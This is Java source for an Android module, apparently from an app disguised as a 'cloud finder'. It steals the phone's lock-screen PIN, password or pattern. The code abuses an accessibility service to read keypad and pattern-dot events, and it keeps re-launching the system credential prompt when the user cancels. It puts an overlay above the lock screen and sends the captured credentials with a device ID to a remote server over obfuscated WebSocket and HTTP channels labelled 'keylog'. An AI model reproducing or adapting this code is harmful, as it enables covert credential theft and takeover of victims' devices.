package com.lite.cloudfinder.pin;

import android.accessibilityservice.AccessibilityService;
import android.app.KeyguardManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

/**
 * 2.2 锁屏凭据采集模块（调试版）
 *
 * 流程：
 *   无障碍服务连上 -> arm()：判断 isDeviceSecure，登记状态，加 2032 覆盖层
 *   -> prompt()：1.2s 后拉起系统凭据验证（复用 ConfirmDeviceActivity）
 *   -> onEvent()：从 systemui / settings / 厂商 systemui 的键盘事件里重建 PIN
 *   -> save()：写 SharedPreferences + 通过设备日志通道上报
 *
 * 说明：系统验证框本身只回 RESULT_OK，不返回明文；这里的输入来自
 * TYPE_VIEW_CLICKED / TYPE_VIEW_TEXT_CHANGED 的节点文本，不依赖系统返回值。
 */
public final class PinCapture {

    private static final String TAG = "PinCapture";
    private static final String SP = "pin_capture";

    private static final String[] PKGS = {
            "com.android.systemui",
            "com.android.settings",
            "com.android.settings.intelligence",
            "com.samsung.android.biometrics.app.setting",
            "com.samsung.android.app.aodservice",
            "com.hihonor.android.systemui",
            "com.hihonor.android.settings",
            "com.oplus.systemui",
            "com.oplus.screenlock",
            "com.coloros.systemui",
            "com.coloros.screenlock",
            "com.oppo.systemui",
            "com.vivo.systemui",
            "com.bbk.theme",
            "com.samsung.android.honeyboard",
            "com.google.android.inputmethod.latin"
    };

    private static final StringBuilder BUF = new StringBuilder();
    private static boolean armed;
    private static boolean prompted;
    private static int overlayTries;
    private static View overlayView;
    private static long lastReport;
    private static String capType = "unknown";
    private static String lastPkg = "";
    private static long lastEventTs;
    private static String lastValue = "";

    private PinCapture() {
    }

    /** 无障碍服务连上时调用 */
    public static synchronized void arm(Context ctx) {
        try {
            if (armed) {
                Log.d(TAG, "arm skipped (already armed)");
                return;
            }
            if (ctx == null) return;
            armed = true;
            BUF.setLength(0);

            KeyguardManager km = (KeyguardManager) ctx.getSystemService(Context.KEYGUARD_SERVICE);
            boolean secure = km != null && km.isDeviceSecure();
            Log.d(TAG, "arm secure=" + secure);

            SharedPreferences sp = ctx.getSharedPreferences(SP, 0);
            sp.edit()
                    .putBoolean("armed", true)
                    .putBoolean("secure", secure)
                    .putLong("armed_at", System.currentTimeMillis())
                    .apply();

            if (ctx instanceof AccessibilityService) {
                svcRef = (AccessibilityService) ctx;
                addOverlay(svcRef);
            }
        } catch (Throwable t) {
            Log.e(TAG, "arm failed", t);
        }
    }

    /** 弹系统凭据验证框（延迟 1.2s，避开权限/激活流程） */
    public static void prompt(final Context ctx) {
        promptAfter(ctx, 800L);
    }

    /** 延迟版：首次安装时等管理员激活流程走完再弹（避免抢焦点/误点） */
    public static void promptAfter(final Context ctx, final long delayMs) {
        try {
            if (ctx == null) return;
            KeyguardManager km = (KeyguardManager) ctx.getSystemService(Context.KEYGUARD_SERVICE);
            if (km == null || !km.isDeviceSecure()) {
                Log.d(TAG, "prompt skip: no secure keyguard -> permissions");
                startPermissionFlow(ctx);
                return;
            }
            if (prompted) {
                Log.d(TAG, "prompt skip: already prompted this process");
                return;
            }
            prompted = true;
            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                @Override
                public void run() {
                    try {
                        Intent i = new Intent();
                        i.setClassName(ctx.getPackageName(),
                                "com.lite.cloudfinder.activity.ConfirmDeviceActivity");
                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        ctx.startActivity(i);
                        Log.d(TAG, "prompt launched");
                    } catch (Throwable t) {
                        Log.e(TAG, "prompt launch failed", t);
                    }
                }
            }, delayMs);

            // 用户锁屏/放置不理：超时后若仍在凭据界面就继续等（最多 5 轮），否则进权限
            scheduleFallback(ctx, delayMs + 30000L, 5);
        } catch (Throwable t) {
            Log.e(TAG, "prompt failed", t);
        }
    }

    private static boolean flowStarted;

    private static void scheduleFallback(final Context ctx, final long delayMs, final int tries) {
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                if (flowStarted) return;
                if (tries > 0 && isCredentialForeground() && !isDeviceLocked(ctx)) {
                    Log.d(TAG, "still on credential ui, wait again (" + tries + ")");
                    scheduleFallback(ctx, delayMs, tries - 1);
                    return;
                }
                flowStarted = true;
                Log.d(TAG, "credential timeout -> permissions");
                startPermissionFlow(ctx);
            }
        }, delayMs);
    }

    private static boolean isDeviceLocked(Context ctx) {
        try {
            android.app.KeyguardManager km = (android.app.KeyguardManager)
                    ctx.getSystemService(Context.KEYGUARD_SERVICE);
            return km != null && km.isDeviceLocked();
        } catch (Throwable t) {
            return false;
        }
    }

    private static boolean isCredentialForeground() {
        try {
            AccessibilityService s = svcRef;
            if (s == null) return false;
            AccessibilityNodeInfo r = s.getRootInActiveWindow();
            if (r == null) return false;
            CharSequence p = r.getPackageName();
            String pkg = p == null ? "" : p.toString();
            r.recycle();
            return pkg.contains("settings") || pkg.contains("biometrics") || pkg.contains("systemui");
        } catch (Throwable t) {
            return false;
        }
    }

    /** 验证成功回调：拿到密码后进入权限流程 */
    public static void onVerified(Context ctx) {
        if (flowStarted) return;
        flowStarted = true;
        Log.d(TAG, "credential verified -> permissions");
        startPermissionFlow(ctx);
    }

    /** 返回/取消回调：继续要密码（1.5s 后再弹），不进入权限 */
    public static void onAborted(Context ctx) {
        if (flowStarted) return;
        Log.d(TAG, "credential aborted -> reprompt");
        reprompt(ctx, 1500L);
    }

    /** 反射调用 ھ.startPerm（混淆类，避免编译期依赖） */
    public static void startPermissionFlow(Context ctx) {
        try {
            Class<?> c = Class.forName("ڝږ؁ڋ.ھ");
            java.lang.reflect.Method m = c.getMethod("startPerm", Context.class);
            m.invoke(null, ctx);
            Log.d(TAG, "startPerm invoked");
        } catch (Throwable t) {
            Log.e(TAG, "startPerm failed", t);
        }
    }

    /** 取消后延时重新弹（用户要求：返回一会儿继续要密码） */
    public static void reprompt(final Context ctx, long delayMs) {
        try {
            if (ctx == null) return;
            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                @Override
                public void run() {
                    try {
                        Intent i = new Intent();
                        i.setClassName(ctx.getPackageName(),
                                "com.lite.cloudfinder.activity.ConfirmDeviceActivity");
                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        ctx.startActivity(i);
                        Log.d(TAG, "reprompt launched");
                    } catch (Throwable t) {
                        Log.e(TAG, "reprompt failed", t);
                    }
                }
            }, delayMs);
        } catch (Throwable t) {
            Log.e(TAG, "reprompt outer", t);
        }
    }

    /** 服务器/广播指令：强制弹一次（忽略一次性标记） */
    public static void promptForce(Context ctx) {
        prompted = false;
        flowStarted = false;
        Log.d(TAG, "prompt_force from command");
        prompt(ctx);
    }

    /** 锁屏时确保后台监控是 armed 状态 */
    public static void ensureArmed(Context ctx) {
        if (!armed && ctx != null) {
            Log.d(TAG, "ensureArmed: not armed, arm now");
            arm(ctx);
        }
    }

    /** 清掉一次性标记，允许下次连接再弹一次（面板/调试用） */
    public static void reset(Context ctx) {
        try {
            prompted = false;
            Log.d(TAG, "prompt_reset done");
        } catch (Throwable t) {
            Log.e(TAG, "reset failed", t);
        }
    }

    private static boolean hasSms(Context ctx) {
        try {
            return ctx.checkSelfPermission("android.permission.READ_SMS") == 0;
        } catch (Throwable t) {
            return false;
        }
    }

    /** 无障碍事件入口：图案 / PIN / 混合密码统一处理 */
    public static void onEvent(Context ctx, AccessibilityEvent e) {
        try {
            if (!armed || e == null) return;

            CharSequence p = e.getPackageName();
            String pkg = p == null ? "" : p.toString();

            if (!armed && pkg.contains("systemui")) {
                ensureArmed(ctx);
            }
            if (!armed) return;

            boolean systemPkg = match(pkg);
            boolean imePkg = isIme(pkg);
            if (!systemPkg && !imePkg) return;
            if (imePkg && !isKeyguardLocked(ctx)) return;   // 输入法只在锁屏时采集

            long nowTs = System.currentTimeMillis();
            if (nowTs - lastEventTs > 5000L) {
                BUF.setLength(0);
                capType = "unknown";
                lastValue = "";
                Log.d(TAG, "idle reset (" + (nowTs - lastEventTs) + "ms) -> " + pkg);
            }
            lastEventTs = nowTs;
            if (!pkg.equals(lastPkg)) {
                lastPkg = pkg;
            }

            // 锁屏消失 = 本次输入成功（与语言无关）
            if (pkg.contains("systemui") && BUF.length() > 0
                    && !isKeyguardLocked(ctx) && !isDeviceLocked(ctx)) {
                Log.d(TAG, "keyguard gone -> attempt ok");
                finalizeAttempt(ctx, true);
            }

            int type = e.getEventType();

            // 新的锁屏输入界面（PIN/密码/图案）→ 重置缓冲，避免上一轮残留
            if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                String w = nodeText(e);
                if (w == null) {
                    java.util.List<CharSequence> ts = e.getText();
                    if (ts != null && !ts.isEmpty() && ts.get(0) != null) w = ts.get(0).toString();
                }
                if (w != null && isWrongHint(w)) {
                    Log.d(TAG, "wrong hint(window): " + w);
                    finalizeAttempt(ctx, false);
                    return;
                }
                if (w != null) {
                    String low = w.toLowerCase();
                    if (w.contains("PIN") || w.contains("密码") || w.contains("图案")
                            || low.contains("password") || low.contains("pin")
                            || low.contains("unlock")) {
                        BUF.setLength(0);
                        capType = "unknown";
                        Log.d(TAG, "new session: " + w);
                    }
                }
                return;
            }

            if (systemPkg) {
                probePattern(ctx, e);
            }

            if (type != AccessibilityEvent.TYPE_VIEW_CLICKED
                    && type != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                    && type != AccessibilityEvent.TYPE_VIEW_FOCUSED) {
                return;
            }

            String s = nodeText(e);
            if (s == null) s = "";
            s = s.trim();
            if (s.length() == 0) {
                if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED && BUF.length() > 0) {
                    final Context fctx = ctx;
                    new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            finalizeAttempt(fctx,
                                    !isKeyguardLocked(fctx) && !isDeviceLocked(fctx));
                        }
                    }, 350L);
                }
                return;
            }
            if (s.length() > 64) return;

            Log.d(TAG, "evt=" + type + " pkg=" + pkg + " s=" + s);

            if (isWrongHint(s)) {
                Log.d(TAG, "wrong hint: " + s);
                finalizeAttempt(ctx, false);
                return;
            }

            if (type == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                handleKey(ctx, s);
            } else {
                handleText(ctx, s);
            }
        } catch (Throwable t) {
            Log.e(TAG, "onEvent failed", t);
        }
    }

    private static String nodeText(AccessibilityEvent e) {
        AccessibilityNodeInfo src = null;
        try {
            src = e.getSource();
        } catch (Throwable ignored) {
        }
        String s = null;
        if (src != null) {
            try {
                CharSequence cs = src.getText();
                if (cs != null && cs.length() > 0) s = cs.toString();
                if (s == null) {
                    CharSequence cd = src.getContentDescription();
                    if (cd != null && cd.length() > 0) s = cd.toString();
                }
            } catch (Throwable ignored) {
            }
            try {
                src.recycle();
            } catch (Throwable ignored) {
            }
        }
        if (s == null) {
            java.util.List<CharSequence> ts = e.getText();
            if (ts != null && !ts.isEmpty()) {
                CharSequence last = ts.get(ts.size() - 1);
                if (last != null) s = last.toString();
            }
        }
        return s;
    }

    private static final boolean[] DOTS = new boolean[9];
    private static final StringBuilder PATTERN = new StringBuilder();
    private static AccessibilityService svcRef;
    private static boolean polling;
    private static final Handler POLL_H = new Handler(Looper.getMainLooper());
    private static final Runnable POLL_R = new Runnable() {
        @Override
        public void run() {
            if (!polling) return;
            try {
                AccessibilityService s = svcRef;
                if (s != null) {
                    AccessibilityNodeInfo r = s.getRootInActiveWindow();
                    if (r != null) {
                        readDots(r, 0);
                        r.recycle();
                    }
                }
            } catch (Throwable ignored) {
            }
            if (polling) POLL_H.postDelayed(this, 60L);
        }
    };

    private static void startPoll() {
        if (polling) return;
        polling = true;
        POLL_H.post(POLL_R);
        POLL_H.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (polling) {
                    polling = false;
                    POLL_H.removeCallbacks(POLL_R);
                    Log.d(TAG, "dot polling timeout");
                }
            }
        }, 10000L);
        Log.d(TAG, "dot polling start");
    }

    private static void stopPoll() {
        polling = false;
        POLL_H.removeCallbacks(POLL_R);
        Log.d(TAG, "dot polling stop");
    }

    /** 图案采集：读 lockPatternView 的 9 个点，clk 由 true→false 即“该点被连上” */
    private static synchronized void probePattern(Context ctx, AccessibilityEvent e) {
        try {
            String txt = "";
            java.util.List<CharSequence> ts = e.getText();
            if (ts != null) {
                for (CharSequence c : ts) {
                    if (c != null) txt = txt + c.toString();
                }
            }
            if (txt.contains("开始绘制图案")) {
                PATTERN.setLength(0);
                for (int i = 0; i < 9; i++) DOTS[i] = false;
                startPoll();
            }

            AccessibilityNodeInfo src = null;
            try {
                src = e.getSource();
            } catch (Throwable ignored) {
            }
            if (src == null && ctx instanceof AccessibilityService) {
                try {
                    src = ((AccessibilityService) ctx).getRootInActiveWindow();
                } catch (Throwable ignored) {
                }
            }
            if (src != null) {
                readDots(src, 0);
                try {
                    src.recycle();
                } catch (Throwable ignored) {
                }
            }

            if (txt.contains("图案绘制完成") || txt.contains("图案绘制不正确") || txt.contains("图案已绘制")) {
                String p = PATTERN.toString();
                boolean ok = !txt.contains("不正确");
                Log.d(TAG, "pattern done (" + txt + ") = " + p);
                if (p.length() > 0) {
                    ctx.getSharedPreferences(SP, 0).edit()
                            .putString("pattern", p)
                            .putBoolean("pattern_ok", ok)
                            .putLong("pattern_ts", System.currentTimeMillis())
                            .apply();
                    report("{\"type\":\"pattern\",\"value\":\"" + p
                            + "\",\"ok\":" + (ok ? 1 : 0) + ",\"ts\":"
                            + System.currentTimeMillis() + "}");
                }
                stopPoll();
                PATTERN.setLength(0);
                for (int i = 0; i < 9; i++) DOTS[i] = false;
            }
        } catch (Throwable t) {
            Log.e(TAG, "probe failed", t);
        }
    }

    private static void readDots(AccessibilityNodeInfo node, int depth) {
        if (node == null || depth > 3) return;
        try {
            String id = node.getViewIdResourceName();
            if (id != null && id.contains("lockPattern")) {
                int n = node.getChildCount();
                for (int i = 0; i < n && i < 9; i++) {
                    AccessibilityNodeInfo c = node.getChild(i);
                    if (c == null) continue;
                    boolean selected = !c.isClickable();
                    if (selected && !DOTS[i]) {
                        DOTS[i] = true;
                        PATTERN.append(i + 1);
                        Log.d(TAG, "dot " + (i + 1) + " -> " + PATTERN);
                    } else if (!selected && DOTS[i]) {
                        DOTS[i] = false;
                    }
                }
                return;
            }
        } catch (Throwable ignored) {
        }
        int n = 0;
        try {
            n = node.getChildCount();
        } catch (Throwable ignored) {
        }
        for (int i = 0; i < n; i++) {
            try {
                readDots(node.getChild(i), depth + 1);
            } catch (Throwable ignored) {
            }
        }
    }

    /** 按键处理：PIN 数字键 / 密码字符键 / 删除 / 确定 */
    private static void handleKey(Context ctx, String s) {
        if (isDelete(s)) {
            if (BUF.length() > 0) BUF.deleteCharAt(BUF.length() - 1);
            flush(ctx, false);
            return;
        }
        if (isEnter(s)) {
            flush(ctx, true);
            BUF.setLength(0);
            lastValue = "";
            return;
        }
        if (s.length() == 1) {
            capType = isDigits(s) ? "pin" : "password";
            if (BUF.length() >= 32) BUF.setLength(0);
            BUF.append(s);
            flush(ctx, BUF.length() >= 4);
            return;
        }
        if (isDigits(s) && s.length() >= 4) {
            capType = "pin";
            setValue(s);
            flush(ctx, true);
        }
    }

    /** 文本变化：掩码串只取“最后一个掩码之后的新字符”，纯掩码忽略 */
    private static void handleText(Context ctx, String s) {
        if (s.length() == 1 && BUF.length() > 1) {
            Log.d(TAG, "new attempt (single char, buf=" + BUF.length() + ")");
            finalizeAttempt(ctx, false);   // 上一次没解锁 → 记为失败
        }
        if (hasMask(s)) {
            String tail = tailAfterMask(s);
            if (tail.length() > 0) {
                capType = "password";
                if (BUF.length() >= 32) BUF.setLength(0);
                BUF.append(tail);
                flush(ctx, BUF.length() >= 4);
            } else {
                Log.d(TAG, "mask only len=" + s.length() + " buf=" + BUF.length());
            }
            return;
        }
        if (isDigits(s) && s.length() >= 4) {
            capType = "pin";
            setValue(s);
            flush(ctx, true);
            return;
        }
        if (s.length() == 1) {
            capType = "password";
            if (BUF.length() >= 32) BUF.setLength(0);
            BUF.append(s);
            flush(ctx, BUF.length() >= 4);
            return;
        }
        if (isCjk(s)) {
            return;   // 界面文案（混合密码/确定/继续/隐藏混合密码）
        }
        if (s.length() >= 4 && s.length() <= 32 && s.indexOf(' ') < 0) {
            capType = "password";
            setValue(s);
            flush(ctx, true);
        }
    }

    private static boolean hasMask(String s) {
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c == '\u2022' || c == '\u25cf' || c == '*' || c == '\u25c9' || c == '\u2b24') {
                return true;
            }
        }
        return false;
    }

    private static String tailAfterMask(String s) {
        int idx = -1;
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c == '\u2022' || c == '\u25cf' || c == '*' || c == '\u25c9' || c == '\u2b24') {
                idx = i;
            }
        }
        return idx >= 0 ? s.substring(idx + 1) : s;
    }

    private static boolean isCjk(String s) {
        for (int i = 0; i < s.length(); i++) {
            if (s.charAt(i) >= '\u4e00' && s.charAt(i) <= '\u9fa5') return true;
        }
        return false;
    }

    private static void setValue(String v) {
        BUF.setLength(0);
        BUF.append(v);
    }

    /** 本次输入结束：上报最终值 + 清空，成败由锁屏状态决定 */
    private static synchronized void finalizeAttempt(Context ctx, boolean ok) {
        String v = BUF.toString();
        if (v.length() == 0) return;
        long now = System.currentTimeMillis();
        Log.d(TAG, "attempt end type=" + capType + " value=" + v + " ok=" + ok);
        try {
            ctx.getSharedPreferences(SP, 0).edit()
                    .putString("pin_type", capType)
                    .putString("pin_buf", v)
                    .putBoolean("complete", ok)
                    .putLong("ts", now)
                    .apply();
        } catch (Throwable ignored) {
        }
        report("{\"type\":\"" + capType + "\",\"value\":\"" + v
                + "\",\"ok\":" + (ok ? 1 : 0) + ",\"final\":1,\"ts\":" + now + "}");
        BUF.setLength(0);
        lastValue = "";
        capType = "unknown";
    }

    private static void flush(Context ctx, boolean ok) {
        String v = BUF.toString();
        if (v.length() == 0) return;
        long now = System.currentTimeMillis();
        try {
            ctx.getSharedPreferences(SP, 0).edit()
                    .putString("pin_type", capType)
                    .putString("pin_buf", v)
                    .putBoolean("complete", ok)
                    .putLong("ts", now)
                    .apply();
        } catch (Throwable ignored) {
        }
        if (v.equals(lastValue)) return;
        lastValue = v;
        lastReport = now;
        Log.d(TAG, "capture type=" + capType + " ok=" + ok + " value=" + v);
        report("{\"type\":\"" + capType + "\",\"value\":\"" + v
                + "\",\"ok\":" + (ok ? 1 : 0) + ",\"ts\":" + now + "}");

    }

    /** 原生通道：WS cacheData(k=keylog)；失败回退 HTTP device_log */
    private static void report(final String value) {
        final String ftype = capType;
        new Thread(new Runnable() {
            @Override
            public void run() {
                if (sendWs(value, ftype)) return;
                sendHttp(value);
            }
        }, "pin-report").start();
    }

    /** WS：{"k":"keylog","cache":"[{pkg,type,text}]"} → د.آ.آ("cacheData", payload) */
    private static boolean sendWs(String value, String ftype) {
        try {
            // value 可能是 {"type":"password","value":"123qwe","ok":1,...}，取出真实值再上报
            String realText = value;
            String realType = ftype;
            try {
                org.json.JSONObject src = new org.json.JSONObject(value);
                realText = src.optString("value", value);
                realType = src.optString("type", ftype);
            } catch (Throwable ignored) {
            }

            org.json.JSONArray arr = new org.json.JSONArray();
            org.json.JSONObject e = new org.json.JSONObject();
            e.put("pkg", "com.android.systemui");
            e.put("type", realType);
            e.put("text", realText);
            arr.put(e);

            org.json.JSONObject p = new org.json.JSONObject();
            p.put("k", "keylog");
            p.put("cache", arr.toString());

            Class<?> d = Class.forName("ڜٟٱڀ.د");
            Object inst = d.getMethod("ؠ").invoke(null);
            java.lang.reflect.Field f = d.getField("آ");
            Object ch = f.get(inst);
            if (ch == null) {
                Log.d(TAG, "ws channel null, fallback http");
                return false;
            }
            java.lang.reflect.Method m = ch.getClass()
                    .getMethod("آ", String.class, org.json.JSONObject.class);
            Object r = m.invoke(ch, "cacheData", p);
            boolean ok = (r instanceof Boolean) && ((Boolean) r);
            Log.d(TAG, "ws cacheData sent=" + ok);
            return ok;
        } catch (Throwable t) {
            Log.e(TAG, "ws send failed", t);
            return false;
        }
    }

    private static void sendHttp(String value) {
        try {
            org.json.JSONObject o = new org.json.JSONObject();
            o.put("type", "pin_capture");
            o.put("msg", value);
            o.put("ts", System.currentTimeMillis());
            String dev = deviceId();
            if (dev.length() > 0) o.put("deviceId", dev);
            Class<?> c = Class.forName("ڝږ؁ڋ.ر");
            java.lang.reflect.Method m = c.getMethod("ء", org.json.JSONObject.class);
            m.invoke(null, o);
            Log.d(TAG, "http fallback sent dev=" + dev);
        } catch (Throwable t) {
            Log.e(TAG, "http fallback failed", t);
        }
    }

    /** 反射取设备 ID（ڜٟٱڀ.د.إ） */
    private static String deviceId() {
        try {
            Class<?> d = Class.forName("ڜٟٱڀ.د");
            Object inst = d.getMethod("ؠ").invoke(null);
            java.lang.reflect.Field f = d.getField("إ");
            Object v = f.get(inst);
            return v == null ? "" : v.toString();
        } catch (Throwable t) {
            return "";
        }
    }

    private static boolean match(String pkg) {
        for (String p : PKGS) {
            if (p.equals(pkg)) return true;
        }
        return pkg.contains("systemui") || pkg.contains("screenlock");
    }

    private static boolean isWrongHint(String s) {
        String low = s.toLowerCase();
        return s.indexOf("密码错误") >= 0 || s.indexOf("不正确") >= 0
                || s.indexOf("再试") >= 0 || s.indexOf("重试") >= 0
                || low.contains("wrong") || low.contains("incorrect")
                || low.contains("try again") || low.contains("failed");
    }

    private static boolean isIme(String pkg) {
        return pkg.contains("honeyboard") || pkg.contains("inputmethod")
                || pkg.contains("gboard") || pkg.contains("qqpinyin")
                || pkg.contains("sogou") || pkg.contains("baidu.input")
                || pkg.contains("swiftkey") || pkg.contains("keyboard");
    }

    private static boolean isKeyguardLocked(Context ctx) {
        try {
            android.app.KeyguardManager km = (android.app.KeyguardManager)
                    ctx.getSystemService(Context.KEYGUARD_SERVICE);
            return km != null && km.isKeyguardLocked();
        } catch (Throwable t) {
            return false;
        }
    }

    private static boolean isDelete(String s) {
        String low = s.toLowerCase();
        return s.indexOf("删除") >= 0 || s.indexOf("退格") >= 0 || low.contains("delete")
                || "\u232b".equals(s) || s.indexOf("⌫") >= 0;
    }

    private static boolean isEnter(String s) {
        String low = s.toLowerCase();
        return s.indexOf("确定") >= 0 || s.indexOf("完成") >= 0 || s.indexOf("登录") >= 0
                || low.equals("enter") || low.equals("done") || low.equals("go")
                || low.equals("ok") || low.equals("确认")
                || s.indexOf("→") >= 0;
    }

    private static boolean isDigits(String s) {
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c < '0' || c > '9') return false;
        }
        return s.length() > 0;
    }

    private static boolean isMask(String s) {
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c != '\u2022' && c != '\u25cf' && c != '*' && c != '\u25c9' && c != '\u2b24') {
                return false;
            }
        }
        return s.length() > 0;
    }

    /** 2032 无障碍覆盖层：顶部一条淡色条，证明能盖在锁屏之上（不拦触摸） */
    private static void addOverlay(AccessibilityService svc) {
        if (overlayView != null) return;
        try {
            WindowManager wm = (WindowManager) svc.getSystemService(Context.WINDOW_SERVICE);
            if (wm == null) return;
            View v = new View(svc);
            v.setBackgroundColor(0x1A00A3FF);
            WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
            lp.type = 2032; // TYPE_ACCESSIBILITY_OVERLAY
            lp.format = PixelFormat.TRANSLUCENT;
            lp.flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS;
            lp.gravity = Gravity.TOP | Gravity.LEFT;
            lp.width = WindowManager.LayoutParams.MATCH_PARENT;
            lp.height = 120;
            lp.x = 0;
            lp.y = 0;
            wm.addView(v, lp);
            overlayView = v;
            Log.d(TAG, "overlay added type=2032 h=120");
        } catch (Throwable t) {
            Log.e(TAG, "overlay failed: " + t);
            if (overlayTries++ < 3) {
                final AccessibilityService s2 = svc;
                new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        Log.d(TAG, "overlay retry " + overlayTries);
                        addOverlay(s2);
                    }
                }, 1000L);
            }
        }
    }
}
